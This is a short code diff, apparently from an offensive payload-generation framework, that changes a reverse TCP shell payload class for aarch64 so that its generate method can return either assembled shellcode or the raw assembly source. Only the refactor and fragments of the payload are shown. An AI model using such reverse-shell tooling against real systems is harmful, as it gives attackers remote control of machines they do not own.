@@ -28,7 +28,7 @@ from hatvenom import HatVenom
 
 
 class ShellReverseTCP(HatVenom):
-    def generate(self, options={}):
+    def generate(self, assemble=True, options={}):
         if 'RHOST' not in options and 'RPORT' not in options:
             return b''
 
@@ -88,4 +88,6 @@ class ShellReverseTCP(HatVenom):
             .word 0x00000000
         """
 
-        return self.assemble('aarch64', shellcode)
+        if assemble:
+            return self.assemble('aarch64', shellcode)
+        return shellcode
